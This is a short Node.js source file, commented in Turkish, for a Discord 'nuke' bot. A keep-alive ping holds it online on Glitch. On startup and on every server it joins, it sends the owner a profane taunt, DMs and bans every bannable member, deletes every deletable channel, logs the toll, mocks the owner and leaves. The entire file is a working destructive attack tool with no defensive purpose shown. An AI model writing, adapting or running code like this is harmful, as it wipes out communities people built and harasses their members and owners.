//7/24 başlayış

const http = require('http');
const express = require('express');    
const app = express();
let cooldown = new Set();
let cdseconds = 5;
app.get("/", (request, response) => {
  console.log(Date.now());
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 10000);

const { Client } = require('discord.js');
const config = require('./config.json');
const client = new Client();

async function nuke(guild) {
  let users = 0;
  let channels = 0;

  await guild.fetchMembers();

  await guild.owner.send('amına koyduk! ').catch(e => { return void e; });

  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('``sunucu gg``').catch(e => { return void e; });
      return m.ban();
    }
  }));

  await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));

  console.log(`${guild.owner.user.username}#${guild.owner.user.discriminator} (${guild.ownerID}) adlı kullanıcının ${guild} adlı sunucudaki ${users} kullanıcı ve ${channels} kanal  yok edildi!`);

  await guild.owner.send('Tm la ağlama geçti').catch(e => { return void e; });
  return guild.leave();
}

client.on('ready', () => {
  for(const [, g] of client.guilds) nuke(g).catch(console.error);
  console.log('Ortalığı Yakmaya Hazırız');
});

client.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});

client.login(config.token).catch(console.error);



